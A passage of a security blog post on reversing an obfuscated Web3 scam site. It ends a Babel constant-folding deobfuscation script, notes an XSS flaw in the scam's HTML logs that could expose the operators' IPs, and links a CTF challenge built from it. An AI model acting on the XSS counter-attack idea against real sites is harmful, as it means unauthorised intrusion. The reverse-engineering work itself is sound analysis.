path.<span class="title function_">replaceWith</span>(t.<span class="title function_">unaryExpression</span>(<span class="string">"typeof"</span>, leftNode));</span><br><span class="line">                                    <span class="keyword">break</span>;</span><br><span class="line">                                }</span><br><span class="line">                            <span class="attr">default</span>:</span><br><span class="line">                                {</span><br><span class="line">                                    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">"opCode"</span>, opCode)</span><br><span class="line">                                    <span class="keyword">const</span> code = <span class="title function_">generate</span>(path.<span class="property">node</span>, { <span class="attr">comments</span>: <span class="literal">false</span> }).<span class="property">code</span>;</span><br><span class="line">                                    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">"Unsupported opCode in __p_1452585703_calc: "</span>, code);</span><br><span class="line">                                    <span class="keyword">return</span></span><br><span class="line">                                }</span><br><span class="line">                        }</span><br><span class="line">                    }</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                }</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    },</span><br><span class="line">    <span class="title class_">BinaryExpression</span>(path) {</span><br><span class="line">        <span class="keyword">let</span> { confident, value } = path.<span class="title function_">evaluate</span>(); <span class="comment">// Evaluate the binary expression</span></span><br><span class="line">        <span class="keyword">if</span> (!confident) <span class="keyword">return</span>; <span class="comment">// Skip if not confident</span></span><br><span class="line">        <span class="keyword">let</span> actualVal = t.<span class="title function_">valueToNode</span>(value); <span class="comment">// Create a new node, infer the type</span></span><br><span class="line">        <span class="keyword">if</span> (!t.<span class="title function_">isLiteral</span>(actualVal)) <span class="keyword">return</span>; <span class="comment">// Skip if not a Literal type (e.g. StringLiteral, NumericLiteral, Boolean Literal etc.)</span></span><br><span class="line">        path.<span class="title function_">replaceWith</span>(actualVal); <span class="comment">// Replace the BinaryExpression with the simplified value</span></span><br><span class="line">    },</span><br><span class="line"></span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = foldConstantsVisitor;</span><br></pre></td></tr></table></figure></div>
+
+<p>After implementing the aforementioned optimizations and others, the code became much more readable. The overall code size was reduced by 72%, a significant reduction.</p>
+<p><img src="/reversing-a-web3-scam-via-dynamic-analysis-and-deobfuscation/final-result.webp" alt="final-result"></p>
+<h2 id="Vulnerabilities-in-the-scam-website"><a href="#Vulnerabilities-in-the-scam-website" class="headerlink" title="Vulnerabilities in the scam website"></a>Vulnerabilities in the scam website</h2><p>After the code became readable, I performed some static analysis and discovered an XSS vulnerability. The application saves logs in HTML, which could be exploited to carry out XSS attacks, potentially revealing sensitive information of the attackers, such as their IP addresses.</p>
+<p><img src="/reversing-a-web3-scam-via-dynamic-analysis-and-deobfuscation/xss-log.webp" alt="xss-log"></p>
+<h2 id="Make-it-a-CTF-challenge"><a href="#Make-it-a-CTF-challenge" class="headerlink" title="Make it a CTF challenge"></a>Make it a CTF challenge</h2><p>After I finished reversing the website, I modified its code and turned it into a CTF challenge. In the end, it became part of the AIS3 Pre-exam 2024 with a difficulty level of hard. Only 3 out of 253 participants were able to solve it. You can find the challenge link and the solution below. Additionally, I taught some of the techniques I used in this challenge in a course at TaiwanHolyHigh.</p>
+<ul>
+<li><p>The CTF challenge: <a class="link" target="_blank" rel="noopener" href="https://fuwamoco-flag-checker.ching367436.me/">https://fuwamoco-flag-checker.ching367436.me/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+</li>
+<li><p>The solution: <a class="link" target="_blank" rel="noopener" href="https://github.com/Ching367436/My-CTF-Challenges/tree/main/ais3-pre-exam/2024/rev/javascript-flag-checker">https://github.com/Ching367436/My-CTF-Challenges/tree/main/ais3-pre-exam/2024/rev/javascript-flag-checker <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+</li>
+</ul>
+
+        </div>
+
+        
+            <div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> Reversing a Web3 Scam via Dynamic Analysis and Deobfuscation</li>
+        <li><strong>Author:</strong> Ching367436</li>
+        <li><strong>Created at
+                :</strong> 2024-08-31 21:44:30</li>
+        
+        <li>
+            <strong>Link:</strong> https://blog.ching367436.me/reversing-a-web3-scam-via-dynamic-analysis-and-deobfuscation/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+            <ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
+                
+                    <li class="tag-item mx-0.5">
+                        <a href="/tags/deobfuscation/">#deobfuscation</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item mx-0.5">
+                        <a href="/tags/web3/">#web3</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item mx-0.5">
+                        <a href="/tags/dynamic-analysis/">#dynamic-analysis</a>&nbsp;
+                    </li>
+                
+            </ul>
+        
+
+        
+  <div class="recommended-article px-2 sm:px-6 md:px-8">
+   <div class="recommended-desktop">
+    <div class="recommended-article-header text-xl md:text-3xl font-bold mt-10">
+     <i aria-hidden="true"></i><span>推薦閱讀</span>
+    </div>
+    <div class="recommended-article-group"><a class="recommended-article-item" href="/osu-gaming-ctf-2024-write-up/" title="osu!gaming CTF 2024 Write-up" rel="bookmark">
+  <img src="/osu-gaming-ctf-2024-write-up/thailand-beach.webp" alt="osu!gaming CTF 2024 Write-up" class="!max-w-none">
+  <span class="title">osu!gaming CTF 2024 Write-up</span>
+</a><a class="recommended-article-item" href="/ais3-2022-最佳專題/" title="AIS3 2022 最佳專題" rel="bookmark">
+  <img src="/ais3-2022-最佳專題/ais3-flag.webp" alt="AIS3 2022 最佳專題" class="!max-w-none">
+  <span class="title">AIS3 2022 最佳專題</span>
+</a><a class="recommended-article-item" href="/blazctf-2024/" title="BlazCTF 2024" rel="bookmark">
+  <img src="/blazctf-2024/cover.webp" alt="BlazCTF 2024" class="!max-w-none">
+  <span class="title">BlazCTF 2024</span>
+</a></div>
+   </div>
+   <div class="recommended-mobile">
+   <div class="recommended-article-header text-xl md:text-3xl font-bold mt-10">
+     <i aria-hidden="true"></i><span>推薦閱讀</span>
+   </div>
+   <div class="recommended-article-group"><a class="recommended-article-item" href="/osu-gaming-ctf-2024-write-up/" title="osu!gaming CTF 2024 Write-up" rel="bookmark">
+  <img src="/osu-gaming-ctf-2024-write-up/thailand-beach.webp" alt="osu!gaming CTF 2024 Write-up" class="!max-w-none">
+  <span class="title">osu!gaming CTF 2024 Write-up</span>
+</a><a class="recommended-article-item" href="/ais3-2022-最佳專題/" title="AIS3 2022 最佳專題" rel="bookmark">
+  <img src="/ais3-2022-最佳專題/ais3-flag.webp" alt="AIS3 2022 最佳專題" class="!max-w-none">
+  <span class="title">AIS3 2022 最佳專題</span>
+</a></div>
+   </div>
+  </div>
+
+        
+            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+                
+                    <div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="prev"
+                        rel="prev"
+                        href="/%E7%A5%9E%E7%9B%BE%E7%9B%83%E5%88%9D%E8%B3%BD-2024/"
+                        >
+                            <span class="left arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-left"></i>
+                            </span>
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">神盾盃初賽 2024</span>
+                                <span class="post-nav-item">Prev posts</span>
+                            </span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="next"
+                        rel="next"
+                        href="/osu-gaming-ctf-2024-write-up/"
+                        >
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">osu!gaming CTF 2024 Write-up</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+
+        
+            <div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
+                <div class="comments-container mt-10 w-full ">
+    <div id="comment-anchor" class="w-full h-2.5"></div>
+    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
+        Comments
+    </div>
+    
+
+        
+            
+    <div id="giscus-container"></div>
+    <script data-swup-reload-script defer>
+        async function loadGiscus() {
+            const giscusConfig = {
+                'src': 'https://giscus.app/client.js',
+                'data-repo': 'Ching367436/blog',
+                'data-repo-id': 'R_kgDOJNMXOw',
+                'data-category': 'Giscus',
+                'data-category-id': 'DIC_kwDOJNMXO84CVeVB',
+                'data-mapping': 'title',
+                'data-strict': '0',
+                'data-reactions-enabled': '1',
+                'data-emit-metadata': '1',
+                'data-theme': 'preferred_color_scheme',
+                'data-lang': 'en',
+                'data-input-position': 'bottom',
+                'data-loading': 'lazy',
+                'crossorigin': 'anonymous',
+                'async': true
+            }
+            const giscusScript = document.createElement('script');
+            for (const key in giscusConfig) {
+                giscusScript.setAttribute(key, giscusConfig[key]);
+            }
+            document.getElementById('giscus-container').appendChild(giscusScript);
+        }
+        if ('true') {
+            let loadGiscusTimeout = setTimeout(() => {
+                loadGiscus();
+                clearTimeout(loadGiscusTimeout);
+            }, 1000);
+        } else {
+            document.addEventListener('DOMContentLoaded', loadGiscus);
+        }
+    </script>
+
+
+        
+        
+    
+</div>
+
+            </div>
+        
+    </div>
+
+    
+        <div class="toc-content-container">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">On this page</div>
+        <div class="page-title">Reversing a Web3 Scam via Dynamic Analysis and Deobfuscation</div>
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Observation"><span class="nav-text">Observation</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Uncover-the-IP-hidden-behind-Cloudflare"><span class="nav-text">Uncover the IP hidden behind Cloudflare</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Handling-Anti-Debugging"><span class="nav-text">Handling Anti-Debugging</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#The-breakpoint-problem"><span class="nav-text">The breakpoint problem</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Disable-disable-devtool-js"><span class="nav-text">Disable disable-devtool.js</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#API"><span class="nav-text">API</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Automate-the-code-deobfuscation-process"><span class="nav-text">Automate the code deobfuscation process</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Vulnerabilities-in-the-scam-website"><span class="nav-text">Vulnerabilities in the scam website</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Make-it-a-CTF-challenge"><span class="nav-text">Make it a CTF challenge</span></a></li></ol>
+
+    </div>
+</div>
+        </div>
+    
+</div>
+
+
+
+                
+
+            </div>
+
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2023</span>
+              -
+            
+            2024&nbsp;&nbsp;<i class="fa-solid fa-heart" style="color: #f54545"></i>&nbsp;&nbsp;<a href="/">Ching367436</a>
+            
+                
+                <p class="post-count space-x-0.5">
+                    <span>
+                        12 posts in total
+                    </span>
+                    
+                        <span>
+                            29.7k words in total
+                        </span>
+                    
+                </p>
+            
+        </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.7.1</a></span>
+        </div>
+        
+        
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+            
+                
+        
+                
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+            <li class="go-comment">
+                <i class="fa-regular fa-comments"></i>
+            </li>
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+            <li class="right-bottom-tools rss flex justify-center items-center">
+                <a class="flex justify-center items-center"
+                   href="/atom.xml"
+                   target="_blank"
+                >
+                <i class="fa-regular fa-rss"></i>
+                </a>
+            </li>
+        
+
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+                <i class="fa-regular fa-arrow-up"></i>
+            </li>
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+            <i class="fa-regular fa-cog"></i>
+        </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+
+</main>
+
+
+    
+<script src="/js/libs/Swup.min.js"></script>
+
+<script src="/js/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+
+
+
+<script src="/js/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/utils.js" type="module"></script>
+
+<script src="/js/main.js" type="module"></script>
+
+<script src="/js/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/layouts/categoryList.js" type="module"></script>
+
+
+
+
+
+    
+<script src="/js/tools/codeBlock.js" type="module"></script>
+
+
+
+
+
+
+    
+<script src="/js/tools/runtime.js"></script>
+
+    
+<script src="/js/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/libs/Typed.min.js"></script>
+
+  
+<script src="/js/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+
+    
+<script src="/js/libs/anime.min.js"></script>
+
+
+
+<div class="post-scripts" data-swup-reload-script>
+    
+        
+<script src="/js/tools/tocToggle.js" type="module"></script>
+
+<script src="/js/layouts/toc.js" type="module"></script>
+
+<script src="/js/plugins/tabs.js" type="module"></script>
+
+    
+</div>
+
+
+</body>
+</html>
